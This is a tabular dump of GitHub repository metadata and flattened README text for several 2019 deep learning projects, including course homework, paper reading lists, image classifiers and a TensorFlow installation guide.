yingtaoluo,Nanofiltration-Membrane-Deep-Learning,n/a,Nanofiltration Membrane Deep Learning It is a completed interdisciplinary research project submitted to Communications Materials Main contributions include Deep learning based nanofiltration membrane performance prediction system Spatial geometry based feature engineering data augmentation methods Abstract Machine learning overfitting caused by data scarcity greatly limits the application of chemical artificial intelligence As the data collection for chemical engineering is generally costly here we proposed to extract the natural features of molecular structure and rationally distort it without compromising chemical characteristics to augment the dataset The increased amount of data allows a wider range of chemical engineering projects to leverage the powerful fit of deep learning without big data at the outset The rejection and flux predictions of polyamide nanofiltration membranes were exemplified to practice the chemical data augmentation method in deep learning and test its feasibility Convergence of loss function indicated that the model was effectively optimized Pearson correlation coefficient exceeding 0 80 proved a strong correlation between model predictions and real values The success of predicting nanofiltration membrane performances is also instructive for other disciplines that were featured at molecular level Author Affiliation Statement Ziyang Zhang1 Yingtao Luo2 Huawen Peng1 Yu Chen3 Rong Zhen Liao1 Qiang Zhao1 1 Key Laboratory of Material Chemistry for Energy Conversion and Storage Ministry of Education School of Chemistry and Chemical Engineering Huazhong University of Science and Technology Wuhan 430074 China 2 School of Computer Science Technology Huazhong University of Science and Technology Wuhan 430074 China 3 State Key Laboratory of Advanced Electromagnetic Engineering and Technology AEET also School of Electrical and Electronics Engineering SEEE Huazhong University of Science and Technology Wuhan 430074 China These authors contributed equally Ziyang Zhang Yingtao Luo Author Contact Information Corresponding Author Qiang Zhao zhaoq hust edu cn For technical assistance please contact Yingtao Luo yingtao luo columbia edu Prerequisite Environment Recommended Visual Studio 2017 CUDA 9 0 cudnn 7 4 2 python 3 6 numpy 1 14 5 pytorch 1 12 0 matplotlib 3 0 3 argparse 1 4 0 Instruction Manual We provide codes for neural network training in the repository Because Argparse package is used only by Command Prompt or Shell can you run the code You could vary the variables in the Command Prompt in order to modify the program mode such as training plotting etc To help those who are not familiar with arg text file named cmd instructions has been included in the repository After downloading the data you need to modify the data path in the python file train py before running the codes Data Availability We provide ready made data and codes for data generation in this link https pan baidu com s 1EU6w0xVxbzKk YRX1l3PA Poster Presentation This poster jpg is already in this repository for download image https github com yingtaoluo Nanofiltration Membrane Deep Learning blob master POSTER 20CHEM jpg,2019-10-12T06:02:57Z,2019-12-06T03:18:01Z,Python,yingtaoluo,User,1,1,0,28,master,yingtaoluo,1,0,0,0,0,0,0
MARINEGUB,deep_learning_yogi_api,n/a,deep learning yogi deeplearningyogiapi,2019-10-18T12:58:10Z,2019-10-18T14:05:40Z,Python,MARINEGUB,User,1,1,0,1,master,MARINEGUB,1,0,0,0,0,0,0
MARINEGUB,deep_learning_yogi_interface,n/a,,2019-10-18T12:59:55Z,2019-10-18T13:00:20Z,n/a,MARINEGUB,User,1,1,0,0,master,,0,0,0,0,0,0,0
daggertye,TopologicalDeepLearning,n/a,Topological Deep Learning Papers A collection of Topology Methods in Deep Learning Papers Topological Data Analysis Subsampling Methods For Persistent Homology ICML 2015 https arxiv org abs 1406 1901 Sliced Wasserstein Kernel for Persistence Diagrams ICML 2017 https arxiv org abs 1706 03358 Deep Learning with Topological Signatures NIPS 2017 https arxiv org abs 1707 04041 Neural Persistence ICLR 2019 https arxiv org abs 1812 09764 Topological Data Analysis of Decision Boundaries with Application to Model Selection ICML 2019 https arxiv org abs 1805 09949 Connectivity Optimized Representation Learning via Persistent Homology ICML 2019 https arxiv org abs 1906 09003 Loss Landscapes of Regularized Linear Autoencoders ICML 2019 https arxiv org abs 1901 08168 PersLay A Simple and Versatile Neural Network Layer for Persistence Diagrams Preprint 2019 https arxiv org abs 1904 09378 Topological Autoencoders ICLR 2020 Submission https openreview net pdf id HkgtJRVFPS The Power of Depth for Feedforward Neural Networks COLT 2016 https arxiv org abs 1512 03965 On Characterizing the Capacity of Neural Networks Using Algebraic Topology Preprint 2017 https arxiv org abs 1802 04443 Topology of Deep Neural Networks ICLR 2020 Submission https openreview net pdf id SkgBfaNKPr Related Topology Based Deep Learning Papers On The Need For Topology aware Generative Models For Manifold based Defenses ICLR 2020 https openreview net pdf id r1lFCEYwS,2019-10-05T03:27:55Z,2019-10-07T03:06:28Z,n/a,daggertye,User,1,1,0,6,master,daggertye,1,0,0,0,0,0,0
26medias,deep-learning-toolbox,n/a,deep learning toolbox Code snippets to make running deep learning experiments faster,2019-10-29T01:22:38Z,2019-12-06T21:01:09Z,n/a,26medias,User,1,1,0,1,master,26medias,1,0,0,0,0,0,0
yiweiwe,Deep-Learning-Image-Recognition,n/a,Deep Learning Image Recognition Can a machine identify a bee as a honey bee or a bumble bee These bees have different behaviors and appearances but given the variety of backgrounds positions and image resolutions it can be a challenge for machines to tell them apart Being able to identify bee species from images is a task that ultimately would allow researchers to more quickly and effectively collect field data Pollinating bees have critical roles in both ecology and agriculture and diseases like colony collapse disorder threaten these species Identifying different species of bees in the wild means that we can better understand the prevalence and growth of these important insects image https user images githubusercontent com 46982385 67970509 7c1d0200 fbe1 11e9 95d0 ece135f75e4a png This notebook walks through building a simple deep learning model that can automatically detect honey bees and bumble bees and then loads a pre trained model for evaluation Load image labels Now that we have all of our imports ready it is time to look at the labels for our data We will load our labels csv file into a DataFrame called labels where the index is the image name e g an index of 1036 refers to an image named 1036 jpg and the genus column tells us the bee type genus takes the value of either 0 0 Apis or honey bee or 1 0 Bombus or bumble bee Examine RGB values in an image matrix Image data can be represented as a matrix The width of the matrix is the width of the image the height of the matrix is the height of the image and the depth of the matrix is the number of channels Most image formats have three color channels red green and blue For each pixel in an image there is a value for every channel The combination of the three values corresponds to the color as per the RGB color model Values for each color can range from 0 to 255 so a purely blue pixel would show up as 0 0 255 image https user images githubusercontent com 46982385 67970806 fea5c180 fbe1 11e9 9d06 4b083a38e3cd png Normalize image data Now we need to normalize our image data Normalization is a general term that means changing the scale of our data so it is consistent In this case we want each feature to have a similar range so our neural network can learn effectively across all the features As explained in the sklearn docs If a feature has a variance that is orders of magnitude larger than others it might dominate the objective function and make the estimator unable to learn from other features correctly as expected We will scale our data so that it has a mean of 0 and standard deviation of 1 We ll use sklearn s StandardScaler to do the math for us which entails taking each value subtracting the mean and then dividing by the standard deviation We need to do this for each color channel i e each feature individually Split into train test and evaluation sets Now that we have our big image data matrix X as well as our labels y we can split our data into train test and evaluation sets To do this we ll first allocate 20 of the data into our evaluation or holdout set This is data that the model never sees during training and will be used to score our trained model We will then split the remaining data 60 40 into train and test sets just like in supervised machine learning models We will pass both the train and test sets into the neural network Model building part i It s time to start building our deep learning model a convolutional neural network CNN CNNs are a specific kind of artificial neural network that is very effective for image classification because they are able to take into account the spatial coherence of the image i e that pixels close to each other are often related Building a CNN begins with specifying the model type In our case we ll use a Sequential model which is a linear stack of layers We ll then add two convolutional layers To understand convolutional layers imagine a flashlight being shown over the top left corner of the image and slowly sliding across all the areas of the image moving across the image in the same way your eyes move across words on a page Convolutional layers pass a kernel a sliding window over the image and perform element wise matrix multiplication between the kernel values and the pixel values in the image Model building part ii Let s continue building our model So far our model has two convolutional layers However those are not the only layers that we need to perform our task A complete neural network architecture will have a number of other layers that are designed to play a specific role in the overall functioning of the network Much deep learning research is about how to structure these layers into coherent systems We ll add the following layers MaxPooling This passes a 2 2 moving window over the image and downscales the image by outputting the maximum value within the window Conv2D This adds a third convolutional layer since deeper models i e models with more convolutional layers are better able to learn features from images Dropout This prevents the model from overfitting i e perfectly remembering each image by randomly setting 25 of the input units to 0 at each update during training Flatten As its name suggests this flattens the output from the convolutional part of the CNN into a one dimensional feature vector which can be passed into the following fully connected layers Dense Fully connected layer where every input is connected to every output see image below Dropout Another dropout layer to safeguard against overfitting this time with a rate of 50 Dense Final layer which calculates the probability the image is either a bumble bee or honey bee To take a look at how it all stacks up we ll print the model summary Notice that our model has a whopping 3 669 249 paramaters These are the different weights that the model learns through training and what are used to generate predictions on a new image image https user images githubusercontent com 46982385 67970958 488ea780 fbe2 11e9 8d12 1d79892c1aa0 png Compile and train model Now that we ve specified the model architecture we will compile the model for training For this we need to specify the loss function what we re trying to minimize the optimizer how we want to go about minimizing the loss and the metric how we ll judge the performance of the model Then we ll call fit to begin the trainig the process Neural networks are trained iteratively using optimization techniques like gradient descent After each cycle of training an error metric is calculated based on the difference between prediction and target Each neurons coefficients weights are then adjusted relative to how much they contributed to the total error This process is repeated iteratively ML Cheatsheet Since training is computationally intensive we ll do a mock training to get the feel for it using just the first 10 images in the train and test sets and training for just 5 epochs Epochs refer to the number of iterations over the data Typically neural networks will train for hundreds if not thousands of epochs Take a look at the printout for each epoch and note the loss on the train set loss the accuracy on the train set acc and loss on the test set valloss and the accuracy on the test set valacc We ll explore this more in a later step Load pre trained model and score Now we ll load a pre trained model that has the architecture we specified above and was trained for 200 epochs on the full train and test sets we created above Let s use the evaluate method to see how well the model did at classifying bumble bees and honey bees for the test and validation sets Recall that accuracy is the number of correct predictions divided by the total number of predictions Given that our classes are balanced a model that predicts 1 0 for every image would get an accuracy around 0 5 Note it may take a few seconds to load the model Recall that our model has over 3 million parameters weights which are what s being loaded Visualize model training history In addition to scoring the final iteration of the pre trained model as we just did we can also see the evolution of scores throughout training thanks to the History object We ll use the pickle library to load the model history and then plot it Notice how the accuracy improves over time eventually leveling off Correspondingly the loss decreases over time Plots like these can help diagnose overfitting If we had seen an upward curve in the validation loss as times goes on a U shape in the plot we d suspect that the model was starting to memorize the test set and would not generalize well to new data image https user images githubusercontent com 46982385 67971059 77a51900 fbe2 11e9 80a8 08e179f52817 png Generate predictions Previously we calculated an overall score for our pre trained model on the validation set To end this notebook let s access probabilities and class predictions for individual images using the predict and predictclasses methods We now have a deep learning model that can be used to identify honey bees and bumble bees in images The next step is to explore transfer learning which harnesses the prediction power of models that have been trained on far more images than the mere 1600 in our dataset image https user images githubusercontent com 46982385 67971100 88ee2580 fbe2 11e9 931d f12ac99d2234 png,2019-10-31T17:03:58Z,2019-10-31T17:31:22Z,Jupyter Notebook,yiweiwe,User,1,1,0,4,master,yiweiwe,1,0,0,0,0,0,0
guyulongcs,Deep-Reinforcement-Learning-Papers,n/a,Deep Reinforcement Learning papers Q learning Machine learning 1992 Q learning NIPS 13 Playing Atari with Deep Reinforcement Learning DQN Nature 2015 Human level control through deep reinforcement learning AAAI 15 Deep Recurrent Q Learning for Partially Observable MDPs ICML 16 Continuous Deep Q Learning with Model based Acceleration DDQN AAAI 16 Deep Reinforcement Learning with Double Q Learning ICLR 16 Prioritized experience replay Arxiv 15 Dueling Network Architectures for Deep Reinforcement Learning HER NIPS 17 Hindsight Experience Replay C51 ICML 17 A Distributional Perspective on Reinforcement Learning ICLR 18 Distributed Prioritized Experience Replay AAAI 18 Rainbow Combining Improvements in Deep Reinforcement Learning Policy Gradients REINFORCE ML 1992 Simple statistical gradient following algorithms for connectionist reinforcement learning NIPS 2010 Policy gradient methods for reinforcement learning with function approximation NIPS 16 Safe and efficient off policy reinforcement learning GAE ICLR 16 High Dimensional Continuous Control Using Generalized Advantage Estimation ICML 17 Constrained Policy Optimization ICML 13 Guided Policy Search TRPO ICML 15 Trust Region Policy Optimization PPO Arxiv 17 Proximal Policy Optimization Algorithms ICLR 18 The Mirage of Action Dependent Baselines in Reinforcement Learning Actor Critic NIPS 2000 Actor critic algorithms NIPS 2010 Policy gradient methods for reinforcement learning with function approximation ACC 2010 Model free reinforcement learning with continuous action in practice ICML 12 Off policy actor critic SIAM 2013 On actor critic algorithms A2C A3C ICML 16 Asynchronous methods for deep reinforcement learning ICLR 16 High Dimensional Continuous Control Using Generalized Advantage Estimation ACER ICLR 17 Sample Efficient Actor Critic with Experience Replay Q Prop ICLR 17 Q Prop Sample Efficient Policy Gradient with An Off Policy Critic SAC ICML 18 Soft Actor Critic Off Policy Maximum Entropy Deep Reinforcement Learning with a Stochastic Actor Deterministic Policy Gradients DPG ICML 14 Deterministic policy gradient algorithms DDPG ICLR 16 Continuous control with deep reinforcement learning ACKTR NIPS 17 Scalable trust region method for deep reinforcement learning using Kronecker factored approximation TD3 ICML 18 Addressing Function Approximation Error in Actor Critic Methods Transfer learning Arxiv 16 Progressive Neural Networks ICLR 16 Actor Mimic Deep Multitask and Transfer Reinforcement Learning Meta learning ICLR 16 RL2 FAST REINFORCEMENT LEARNING VIA SLOW REINFORCEMENT LEARNING ICML 17 Model agnostic meta learning for fast adaptation of deep networks SNAIL ICLR 18 A Simple Neural Attentive Meta Learner Arxiv 17 Learning to Learn Meta Critic Networks for Sample Efficient Learning CogSci 17 Learning to Reinforcement Learn ICLR 19 Unsupervised Meta Learning for Reinforcement Learning NIPS 18 Some Considerations on Learning to Explore via Meta Reinforcement Learning Model based RL AlphaZero Axiv 17 Mastering Chess and Shogi by Self Play with a General Reinforcement Learning Algorithm Nature 2017 Mastering the Game of Go without Human Knowledge I2A NIPS 17 Imagination Augmented Agents for Deep Reinforcement Learning MBMF Arxiv 18 Neural Network Dynamics for Model Based Deep Reinforcement Learning with Model Free Fine Tuning MBVE ICML 18 Model Based Value Expansion for Efficient Model Free Reinforcement Learning Arxiv 18 World Models Distributional RL C51 ICML 17 A Distributional Perspective on Reinforcement Learning IQN ICML 18 Implicit Quantile Networks for Distributional Reinforcement Learning QR DQN AAAI 18 Distributional Reinforcement Learning with Quantile Regression Dopamine Arxiv 18 Dopamine A Research Framework for Deep Reinforcement Learning Arxiv 18 IMPALA Scalable Distributed Deep RL with Importance Weighted Actor Learner Architectures Arxiv 19 Horizon Facebooks Open Source Applied Reinforcement Learning Platform Combining Policy Learning and Q Learning PCL NIPS 17 Bridging the Gap Between Value and Policy Based Reinforcement Learning Trust PCL ICLR 18 Trust PCL An Off Policy Trust Region Method for Continuous Control Arxiv 18 Equivalence Between Policy Gradients and Soft Q Learning IPG Arxiv 17 Interpolated Policy Gradient Merging On Policy and Off Policy Gradient Estimation for Deep Reinforcement Learning PGQL ICLR 17 Combining Policy Gradient and Q learning Reactor ICLR 18 The Reactor A Fast and Sample Efficient Actor Critic Agent for Reinforcement Learning Hierarchy NIPS 16 Strategic Attentive Writer for Learning Macro Actions ICML 17 FeUdal Networks for Hierarchical Reinforcement Learning NIPS 18 Data Efficient Hierarchical Reinforcement Learning Reproducibility Analysis and Critique RLLab ICML 16 Benchmarking Deep Reinforcement Learning for Continuous Control Arxiv 17 Reproducibility of Benchmarked Deep Reinforcement Learning Tasks for Continuous Control Offline Evaluation WSDM 18 Offline A B testing for Recommender Systems ICML 16 Data Efficient Off Policy policy evaluation for reinforcement learning ICML 16 Doubly Robust Off policy Value Evaluation for Reinforcement Learning NIPS 17 Using Options and Covariance Testing for Long Horizon Off Policy Policy Evaluation NIPS 17 Breaking the Curse of Horizon Infinite Horizon Off Policy Estimation WSDM 19 When People Change their Mind Off Policy Evaluation in Non stationary Recommendation Environments Arixv 19 Off Policy Evaluation via Off Policy Classification Summary On policy VPG TRPO PPO Off policy DDPG TD3 SAC Links https spinningup openai com en latest spinningup keypapers html https lilianweng github io lil log 2018 02 19 a long peek into reinforcement learning html https lilianweng github io lil log 2018 04 08 policy gradient algorithms html,2019-09-28T07:29:27Z,2019-11-02T04:33:26Z,n/a,guyulongcs,User,1,1,0,3,master,guyulongcs,1,0,0,0,0,0,0
BohriumKwong,Deep_learning_in_WSI,n/a,OpenslideOpenCV WSI Installation pip install r requirements txt opencv opencv pythondemo pyjupyter notebookipynb python opencv3 X4 X openslide openslide README md openslidedemo py openslidegetthumbnailreadregionpyjupyter notebookipynb labelgetpatch py label mask WSIopenslidereadregiondemo bigpatchtransfromsamping py WSIStaintoolsnormalizationV WSI044 patch predictinpatch py labelgetpatchkeraspytorch tricksinprocessingandtraining tricksinprocessingandtraining README md normalization StainTools StainTools https github com Peter554 StainTools VMV core dump c pythonMpython spams 2 6 1 2 6 1 spams pip install setup py python setup py install utils opencvutils py opencv openslideutils py openslideutils staintrans py python from skimage import io from utils staintrans import standardtransfrom from utils openslideutils import Slide slide Slide svsfile normalizetargetimg io imread TUM AGQGDHKE tif normalizemethod standardtransfrom normalizetargetimg M slideregion np array slide readregion x yy 0 patchsize patchsize 3 slideregion normalizemethod transform slideregion copy tissueutils WSI 201 xmlutils py xml 16559 xml python from utils xmlutils import xmltoregion regionhandler from utils openslideutils import Slide import numpy as np xmlfile os path join INPUTXMLDIR pklname xml slide Slide svsfile tile slide getthumb if xml and os path exists xmlfile regionlist regionclass xmltoregion xmlfile svsimnpy regionhandler tile regionlist regionclass slide getleveldownsample svsimnpy np array svsimnpy convert RGBA else svsimnpy np array tile convert RGBA,2019-10-09T07:48:24Z,2019-12-12T02:22:46Z,Jupyter Notebook,BohriumKwong,User,1,1,1,2,master,BohriumKwong,1,0,0,0,0,1,0
zhouyong1234,Deep-Learning-Coursera,n/a,Deep Learning Specialization on Coursera Master Deep Learning and Break into AI https www coursera org specializations deep learning This is my personal projects for the course The course covers deep learning from begginer level to advanced Highly recommend anyone wanting to break into AI Instructor Andrew Ng DeepLearning ai Course 1 Neural Networks and Deep Learning https www youtube com watch v CS4cs9xVecg list PLkDaE6sCZn6Ec XTbcX1uRg2u4xOEky0 1 Week1 Introduction to deep learning https github com enggen Deep Learning Coursera tree master Neural 20Networks 20and 20Deep 20Learning 2 Week2 Neural Networks Basics https github com enggen Deep Learning deeplearning ai blob master Neural 20Networks 20and 20Deep 20Learning Logistic 20Regression 20with 20a 20Neural 20Network 20mindset ipynb 3 Week3 Shallow neural networks https github com enggen Deep Learning deeplearning ai blob master Neural 20Networks 20and 20Deep 20Learning Logistic 20Regression 20with 20a 20Neural 20Network 20mindset ipynb 4 Week4 Deep Neural Networks https github com enggen Deep Learning deeplearning ai tree master Neural 20Networks 20and 20Deep 20Learning Course 2 Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization https www youtube com watch v 1waHlpKiNyY list PLkDaE6sCZn6Hn0vK8co82zjQtt3T2Nkqc 1 Week1 Practical aspects of Deep Learning https github com enggen Deep Learning deeplearning ai tree master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Setting up your Machine Learning Application Regularizing your neural network Setting up your optimization problem 2 Week2 Optimization algorithms https github com enggen Deep Learning deeplearning ai tree master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization 3 Week3 Hyperparameter tuning Batch Normalization and Programming Frameworks https github com enggen Deep Learning Coursera tree master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Course 3 Structuring Machine Learning Projects https www youtube com watch v dFX8k1kXhOw list PLkDaE6sCZn6E7jZ9sNxHwSHOdjUxUWb 1 Week1 Introduction to ML Strategy https github com enggen Deep Learning Coursera blob master Structuring 20Machine 20Learning 20Projects Week 201 20Quiz 20 20Bird 20recognition 20in 20the 20city 20of 20Peacetopia 20 case 20study md Setting up your goal Comparing to human level performance 2 Week2 ML Strategy 2 https github com enggen Deep Learning Coursera blob master Structuring 20Machine 20Learning 20Projects Week 202 20Quiz 20 20Autonomous 20driving 20 case 20study md Error Analysis Mismatched training and dev test set Learning from multiple tasks End to end deep learning Course 4 Convolutional Neural Networks https www youtube com watch v ArPaAXPhIs list PLkDaE6sCZn6Gl29AoE31iwdVwSG KnDzF 1 Week1 Foundations of Convolutional Neural Networks https github com enggen Deep Learning Coursera tree master Convolutional 20Neural 20Networks Week1 2 Week2 Deep convolutional models case studies https github com enggen Deep Learning Coursera tree master Convolutional 20Neural 20Networks Week2 ResNets Papers for read ImageNet Classification with Deep Convolutional Neural Networks https papers nips cc paper 4824 imagenet classification with deep convolutional neural networks pdf Very Deep Convolutional Networks For Large Scale Image Recognition https arxiv org pdf 1409 1556 pdf 3 Week3 Object detection https github com enggen Deep Learning Coursera tree master Convolutional 20Neural 20Networks Week3 Car 20detection 20for 20Autonomous 20Driving Papers for read You Only Look Once Unified Real Time Object Detection https arxiv org pdf 1506 02640 pdf YOLO https arxiv org pdf 1612 08242 pdf 4 Week4 Special applications Face recognition Neural style transfer https github com enggen Deep Learning Coursera tree master Convolutional 20Neural 20Networks Week4 Papers for read DeepFace https www cs toronto edu ranzato publications taigmancvpr14 pdf FaceNet https www cv foundation org openaccess contentcvpr2015 papers SchroffFaceNetAUnified2015CVPRpaper pdf Course 5 Sequence Models https www youtube com watch v DejHQYAGb7Q list PLkDaE6sCZn6F6wUI9tvSGw1vaFAx6rd6 1 Week1 Recurrent Neural Networks https github com enggen Deep Learning Coursera tree master Sequence 20Models Week1 2 Week2 Natural Language Processing Word Embeddings https github com enggen Deep Learning Coursera tree master Sequence 20Models Week2 3 Week3 Sequence models Attention mechanism https github com enggen Deep Learning Coursera tree master Sequence 20Models Week3,2019-09-23T06:41:55Z,2019-10-12T00:32:05Z,Jupyter Notebook,zhouyong1234,User,1,1,0,196,master,enggen,1,0,0,0,0,0,0
DandDevy,mnistDeepLearning,n/a,mnistDeepLearning I made this during a weekend in the summer I had been watching videos for a while on neural networks and I had heard of TensorFlow so wanted to try it out This NN will predict handwritten numbers from 0 to 9 in a 28 28px image I made this in the mnistEp1 ipynb file on Jupyter Notebook ipynb files are strugglying to load on github So I downloaded it as python and put it here so it would be easier to view mnistEp1 py wasn t actually created or used while making this Just made so the actual code could be viewed on github in mnistEp1 ipynb I had followed a tutorial by https www youtube com user sentdex,2019-09-22T18:07:12Z,2019-10-20T21:54:17Z,Jupyter Notebook,DandDevy,User,1,1,0,7,master,DandDevy,1,0,0,0,0,0,0
seunghyun-Ka,Machine-deep-learning,n/a,Neuralnettrain,2019-10-13T16:06:59Z,2019-11-20T10:12:55Z,n/a,seunghyun-Ka,User,1,1,0,8,master,seunghyun-Ka,1,0,0,0,0,0,0
CaptainE,Deep-Unsupervised-Learning,cs294-158#flow#gan#generative-models#made#pixelcnn#uc-berkeley#unsupervised-learning#vae,Deep Unsupervised Learning Pytorch implementatiions of the Homeworks in course CS294 158 Here you can find PyTorch implementations of a Masked Autoencoder for Distribution Estimation PixelCNN RealNVP and other architectures that are used in course Homework 1 For the first homework there is a PyTorch implementation of PixelCNN MADE That is a auto regressive model which mixes ideas from the two papers Pixel Recurrent Neural Networks https arxiv org abs 1601 06759 2016 and MADE Masked Autoencoder for Distribution Estimation https arxiv org abs 1502 03509 2015 to produce colored 28x28 MNIST digits Pixel intensities have been quantized to 2 bits i e four intensities for each color channel The dataset can be downloaded from here https drive google com open id 1hm077GxmIBP foHxiPtTxSNy371yowk2 Training data I have used 60 000 quantized 28x28 images from the colored MNIST dataset Here s a few samples from the training set TrainingSet https i imgur com 5YqSFBl png Examples After 50 epochs of training a network consisting of 12 residual blocks see Deep Residual Learning for Image Recognition https arxiv org abs 1512 03385 2015 followed by a 3 layer MADE generates samples like the following Example https i imgur com amfxoUy png You are very welcome to extend the code however you like If you produce anything cool be sure to let me know Homework 2 For the second homework we implement RealNVP coupling layers for modelling flows Training data Here I have used 5000 datapoints sampled from this distribution TrainingSet https i imgur com stOm8dK png Example After 500 epochs we can sample the following face Example https imgur com 72Kbd2J png with this fancy latent space Latent space face https imgur com e8pkrcA png and density plot density plot https imgur com 2TDhRG4 png We also implement RealNVP https arxiv org abs 1605 08803 to achive these results realnvp https imgur com jOiG4KP png Homework 3 We implement a VAE with a gated shortcur connection https arxiv org pdf 1612 08083 and train it on the SVHN dataset The final results look like this donetraining https imgur com utnCudE png Homework 4 In the 4th homework we implement the Wasserstein GAN https arxiv org abs 1704 00028 and draw inspiration from the architecture used in SN GAN https arxiv org abs 1802 05957 This we for 80 K iteration and the training curves and mean inception score look like the following Training curve https imgur com HX55Qtl png InceptionScore https imgur com XLzzanG png And the resulting samples Samples https imgur com BApYcle png,2019-09-23T09:30:52Z,2019-12-02T13:54:30Z,Jupyter Notebook,CaptainE,User,1,1,1,23,master,CaptainE,1,0,0,0,0,0,0
shuangyichen,Deep-Learning-Specialization,n/a,,2019-10-15T06:29:08Z,2019-11-09T13:06:53Z,Python,shuangyichen,User,1,1,0,11,master,shuangyichen,1,0,0,0,0,0,0
jhenstrom,deep_learning_models,n/a,deeplearningmodels,2019-10-16T01:43:23Z,2019-10-16T03:54:43Z,Python,jhenstrom,User,1,1,0,3,master,jhenstrom,1,0,0,0,0,0,0
paaKways,deep-learning-face-detection,n/a,deep learning face detection Face detection using Deep Learning from PyImageSearch intro to opencv python course Face detection from image Detect images in faces using facerecog python Face detection from video stream Detect images from a video stream or video file Key in 0 if you re using webcam when asked for video stream url,2019-10-05T13:19:26Z,2019-10-21T12:08:16Z,Python,paaKways,User,1,1,0,7,master,paaKways,1,0,0,0,0,0,0
yyyujintang,Deep-Learning-Paper-Notes,n/a,,2019-09-29T03:01:30Z,2019-12-04T02:44:07Z,n/a,yyyujintang,User,2,1,1,22,master,yyyujintang,1,0,0,0,0,0,0
PSandeepSandy,Game-of-Deep-Learning,n/a,Game of Deep Learning Ship Classification using Image Processing This is a multi class classification problem with 5 types of ships It was a 2 week nation wide competition Approach Applied SOTA practices like Transfer Learning OpenCV MixUp etc on an image classification problem with 5 classes Used architectures like ResNets NASNets DenseNets etc Used heavy Data Augmentations like Cutout Colour Dimension shifts etc Generated an ensemble of all the best performing models Link to my work https www kaggle com sandeeppat ship classification top 3 5 kernel Rank 25th out of 2000 Top 3 4,2019-09-23T21:38:18Z,2019-09-24T12:03:28Z,n/a,PSandeepSandy,User,1,1,0,6,master,PSandeepSandy,1,0,0,0,0,0,0
AyushRaghuwanshi,Deep_Learning_Project,n/a,DeepLearningProject MLP and SLP model to differentiate between two classes The task is to train a network to discriminate between sonar signals bounced off a metal cylinder and those bounced off a roughly cylindrical rock The label associated with each record contains the letter R if the object is a rock and M if it is a mine,2019-09-26T10:26:41Z,2019-12-10T09:13:37Z,Python,AyushRaghuwanshi,User,0,1,0,3,master,AyushRaghuwanshi,1,0,0,0,0,0,0
chibinjiang,dive_into_deep_learning,deep-learning#jupyter-notebook#mxnet,,2019-10-08T12:48:58Z,2019-12-10T11:32:20Z,Jupyter Notebook,chibinjiang,User,1,1,0,0,master,,0,0,0,0,0,0,0
Iamsdt,UdacityDeepLearningNanodegree,convolutional-neural-networks#deep-learning#gan#generative-adversarial-network#neural-network#python3#pytorch#udacity-nanodegree,Udacity Deep Learning Nanodegree This project was done as a part of My Udacity Deep Learning Nano Degree Projects 1 Bike sharing Source code https github com Iamsdt UdacityDeepLearningNanodegree blob master Neural 20Networks Project1 Yourfirstneuralnetwork ipynb 2 Dog Breed Classifier Source Code https github com Iamsdt UdacityDeepLearningNanodegree blob master CNN Project2 dogapp ipynb License This project is under Apache License 2 0 https github com Iamsdt UdacityDeepLearningNanodegree blob master LICENSE,2019-09-30T03:28:33Z,2019-12-13T17:38:35Z,Jupyter Notebook,Iamsdt,User,1,1,0,36,master,Iamsdt,1,0,0,0,0,0,0
arsenal9971,TUB_MoDL,n/a,TU Berlin course on Mathematics of Deep Learning Tensorflow Session 29 October 2019 Intended for participants of the course contents Navigation About this repository Here you find all the information and materials needed to follow the tensorflow session During this session we will give a short introduction to the deep learning framework Tensorflow and use it to numerically investigate the implications of theoretical results concerning the approximation properties of deep ReLU neural networks In particular we will consider an observation concerning the relationship between the depth of a network the regularity of the chosen acitvation function and the approximation properties of the network made by D Yarotsky in the following paper Yarotsky D 2017 Error bounds for approximations with deep ReLU networks Neural Networks 94 103 114 You can download the paper on arxiv see p 28 for more details Requirements The session will provide possibilities to interactively experiment with some of the code snippets we provide here If you want to actively participate you will need to have the software packages listed below installed on your system The next section gives instructions about how to setup all the required packages using a miniconda virtual environment that you can if you want to easily remove from your system after the session If you already have the required software installed or you want to use a different installation method and know what you are doing excellent If not simply follow the instruction of the next section Here is a list of what you will need Python 3 Tensorflow Jupyter IPython Scipy Numpy Matplotlib Pyplot Installation instructions 1 Make sure you have a version of Python 3 installed You can find instructions on how to do it in the Python wiki 2 Install the miniconda package and environment manager You can find instructions on how to do it in the Conda documentation Make sure to get the version for Python 3 3 Create a new conda environment by running the following in your command line respectively the Anaconda Prompt if you are a Windows user you can choose a different name for the environment if you want code block bash conda create name dlseminar python 3 4 Activate the newly created environment by running code block bash conda activate dlseminar Try code source activate dlseminar instead of code conda activate dlseminar if this did not work 5 Install all the required Python packages within the new environment by running code block bash conda install scipy conda install matplotlib conda install jupyter pip install tensorflow 1 13 0rc1 6 To test if your Tensorflow installation was successful you can open Python 3 in a command line and run code block python import tensorflow as tf print tf version session tf Session If the Tensorflow version is printed correctly and creating the Tensorflow session prints out some additional version information but does not throw an error then you have sucessfully installed Tensorflow and are ready for the practical session,2019-10-20T14:32:53Z,2019-10-28T11:29:34Z,Jupyter Notebook,arsenal9971,User,1,1,4,4,master,arsenal9971,1,0,0,0,0,0,0
golfgang,BayesianDeepLearning,n/a,HW1 Gaussian Processes HW2 Bayesian Neural Nets Hamiltonian Monte Carlo HW3 Bayesian Neural Nets Variational Inference HW4 Variational Autoencoders,2019-10-24T18:36:39Z,2019-11-01T16:03:10Z,Jupyter Notebook,golfgang,User,1,1,0,7,master,golfgang,1,0,0,0,0,0,0
PriyankaChakraborti,CSE-896-Deep-Learning,n/a,CSE 896 Deep Learning,2019-10-02T02:10:07Z,2019-10-05T23:51:00Z,Jupyter Notebook,PriyankaChakraborti,User,1,1,0,21,master,PriyankaChakraborti,1,0,0,0,0,0,0
gsadhas,deep-reinforcement-learning,n/a,deep reinforcement learning This repo contains Deep Reinforcement Learning projects The source code readme file project setup file and run file are available in respective project folders 1 Navigate and Collect Bananas Train an agent to collect yellow bananas Problem Navigate and Collect Bananas https user images githubusercontent com 10624937 42135619 d90f2f28 7d12 11e8 8823 82b970a54d7e gif 2 Continuous Control Reacher environment Train an agent to reach a target location Reacher environment images reacher gif 3 Collaboration and Competition Train an agent to play tennis Tennis images tennis png,2019-09-23T22:07:48Z,2019-11-26T03:29:57Z,Jupyter Notebook,gsadhas,User,1,1,0,35,master,gsadhas,1,0,0,0,0,1,9
